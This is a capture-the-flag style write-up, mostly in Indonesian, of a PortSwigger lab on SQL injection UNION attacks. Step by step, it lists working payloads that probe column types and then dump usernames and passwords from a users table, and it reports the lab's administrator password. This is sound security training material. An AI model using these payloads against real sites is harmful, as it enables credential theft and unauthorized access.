# Lab: SQL injection UNION attack, retrieving multiple values in a single column

## Deskripsi
This lab contains a SQL injection vulnerability in the product category filter. The results from the query are returned in the application's response so you can use a UNION attack to retrieve data from other tables.

The database contains a different table called users, with columns called username and password.

To solve the lab, perform a SQL injection UNION attack that retrieves all usernames and passwords, and use the information to log in as the administrator user.

## Resource
https://portswigger.net/web-security/sql-injection/union-attacks

## Langkah - langkah
1. Masuk ke halaman lab terlebih dahulu menggunakan browser bawaan Burp Suite.
   <img width="1919" height="1136" alt="image" src="https://github.com/user-attachments/assets/277d1b2e-b25f-46e0-9c35-27d878433168" />

2. Setelah itu, aktifkan intercept di Burp Suite, kemudian klik salah satu kategori barang.
   <img width="1919" height="1134" alt="image" src="https://github.com/user-attachments/assets/3769cf94-4899-4fa5-ac25-a3c2a1b4162b" />

3. Cek tipe dan jumlah kolom dari query SQL 
   * 1 kolom string: `'+UNION+SELECT+'a'--`
     <img width="1919" height="1135" alt="image" src="https://github.com/user-attachments/assets/f5e54c53-b77c-4acf-8083-3d8184063047" />
     Hasil:
     <img width="1919" height="1134" alt="image" src="https://github.com/user-attachments/assets/ef72a8f6-87c6-4604-a6d4-b447cefab306" />
   * 1 kolom NULL: `'+UNION+SELECT+NULL--`
     <img width="1919" height="1140" alt="image" src="https://github.com/user-attachments/assets/03106442-14ec-49e2-9a4d-6d53fbec2794" />
     Hasil:
     <img width="1919" height="1136" alt="image" src="https://github.com/user-attachments/assets/29d0b8d4-00a7-4cbd-b0f1-2afb69fa84ed" />
   * 2 kolom string: `'+UNION+SELECT+'a','a'--`
     <img width="1919" height="1139" alt="image" src="https://github.com/user-attachments/assets/69b79650-0ad1-42e9-91fb-66861495a554" />
     Hasil:
     <img width="1919" height="1136" alt="image" src="https://github.com/user-attachments/assets/52fa1add-62a7-4608-b4f4-13bbb225fc81" />
   * 2 kolom NULL + string: `'+UNION+SELECT+NULL,'a'--`
     <img width="1919" height="1136" alt="image" src="https://github.com/user-attachments/assets/d7495980-44f8-4144-87ef-c38b05de55b5" />
     Hasil:
     <img width="1919" height="1135" alt="image" src="https://github.com/user-attachments/assets/b5dbb6ee-893e-44ac-a299-0decb4daeb7d" />
     Karena tidak ada error, maka jumlah dan tipe kolom ini adalah yang benar.

4. Gunakan payload `'+UNION+SELECT+NULL,username||'~'||password+FROM+users--` di parameter `category` untuk mendapatkan daftar username dan password.
   <img width="1919" height="1140" alt="image" src="https://github.com/user-attachments/assets/6bbd278e-0f0c-493e-9096-818caaa19825" />
   Hasil:
   <img width="1919" height="1139" alt="image" src="https://github.com/user-attachments/assets/af24c00c-2d4a-46c1-b377-fb5dab92af41" />
   Password dari user `administrator` adalah `1fvaa1chwhcet2d6z4sy`.

5. Login sebagai user `administrator` dengan credential yang didapatkan.
   <img width="1919" height="1134" alt="image" src="https://github.com/user-attachments/assets/5a829ad5-3a49-4b18-9c8f-645ff30d26da" />


## Catatan
Di soal ini, karena tipe data kolom pertama query SQL adalah NULL, maka tidak bisa dimasukkan kolom `username` atau `password` yang merupakan kolom dengan tipe data string.

Oleh karena itu, untuk mengakali ini, digunakan metode concatenation untuk menggabung kolom `username` dan `password` menjadi satu kolom saja.
